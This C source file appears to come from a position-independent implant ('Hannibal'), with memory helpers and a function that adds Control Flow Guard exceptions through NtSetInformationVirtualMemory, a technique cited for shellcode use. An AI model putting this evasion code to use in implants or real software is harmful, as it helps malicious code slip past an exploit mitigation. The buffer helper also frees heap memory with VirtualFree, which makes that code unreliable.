#include "utility_memory.h"


SECTION_CODE void *pic_memcpy(void* dest, const void* src, size_t n) 
{
    unsigned char* d = (unsigned char*)dest;
    const unsigned char* s = (const unsigned char*)src;
    
    // Copy byte by byte
    while (n--) {
        *d++ = *s++;
    }
    
    return dest;
}

SECTION_CODE INT MemCompare( PVOID s1, PVOID s2, INT len)
{
    PUCHAR p = s1;
    PUCHAR q = s2;
    INT charCompareStatus = 0;

    if ( s1 == s2 ) {
        return charCompareStatus;
    }

    while (len > 0)
    {
        if (*p != *q)
        {
            charCompareStatus = (*p >*q)?1:-1;
            break;
        }
        len--;
        p++;
        q++;
    }
    return charCompareStatus;
}


/*!
 * @brief
 *  add module + function to CFG exception list.
 *
 * @param ImageBase
 * @param Function
 * Also refer to:
 * https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-setprocessvalidcalltargets
 * https://conference.hitb.org/hitbsecconf2023ams/materials/D1T2%20-%20Windows%20Syscalls%20in%20Shellcode%20-%20Advanced%20Techniques%20for%20Malicious%20Functionality%20-%20Bramwell%20Brizendine.pdf
 * https://www.fortinet.com/blog/threat-research/documenting-the-undocumented-adding-cfg-exceptions
 * 
 */
SECTION_CODE VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
) {

    HANNIBAL_INSTANCE_PTR


    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = 0;
    NTSTATUS             NtStatus = STATUS_SUCCESS;

    NtHeader                = (LPVOID)( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = (UINT_PTR)( NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    /* set cfg target call info */
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = (char*)Function - (char*)ImageBase;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    // Possible the call is failing because the loader is not compiled with CFG
    if ( ! NT_SUCCESS( NtStatus = hannibal_instance_ptr->Win32.NtSetInformationVirtualMemory( NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) ) ) ) {
        // hannibal_instance_ptr->Win32.MessageBoxA( NULL, (LPCSTR)"INSIDE NtSetInformationVirtualMemory", "Fail", MB_OK );
        // __debugbreak();
    }
}

/**
 * @brief Appends a wide-character string to a dynamically allocated buffer.
 *
 * This function appends the given wide-character string (`str`) to the buffer
 * pointed to by `buffer`. If the buffer does not have enough space to accommodate
 * the new string, the buffer is reallocated to a larger size to fit the new data.
 * The buffer is allocated in pages (4096 bytes), and the current usage and size
 * are updated accordingly. The function also ensures that the buffer is null-terminated
 * after the append operation. There's probably a cleaner way to do this. TODO: Improve.
 *
 * @param[in,out] buffer A pointer to the buffer (allocated dynamically). The buffer
 *                       will be updated to point to a larger buffer if reallocation
 *                       is necessary.
 * @param[in,out] current_size The current size of the buffer (in bytes). This value
 *                             will be updated if the buffer is reallocated.
 * @param[in,out] current_usage The current amount of data used in the buffer (in bytes).
 *                              This value will be updated after appending the string.
 * @param[in] str A pointer to the wide-character string to append to the buffer.
 *
 * @return void
 */
SECTION_CODE void buffer_append_alloc(UINT8 **buffer, size_t *current_size, size_t *current_usage, const WCHAR *str) 
{
    HANNIBAL_INSTANCE_PTR

    size_t new_byte_count = pic_strlenW(str)*sizeof(WCHAR);
    size_t needed_size = *current_usage + new_byte_count;

    if(needed_size >= *current_size - sizeof(WCHAR)){
        size_t new_size = needed_size + 4096; 
        UINT8* new_buffer = (UINT8*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, new_size);
        pic_memcpy(new_buffer, *buffer, *current_usage);
        hannibal_instance_ptr->Win32.VirtualFree(*buffer, 0, MEM_RELEASE); 
        *buffer = new_buffer;
        *current_size = new_size;
    }

    pic_memcpy(*buffer + *current_usage, str, new_byte_count);
    *current_usage += new_byte_count;
    (*buffer)[*current_usage] = L'\0';
}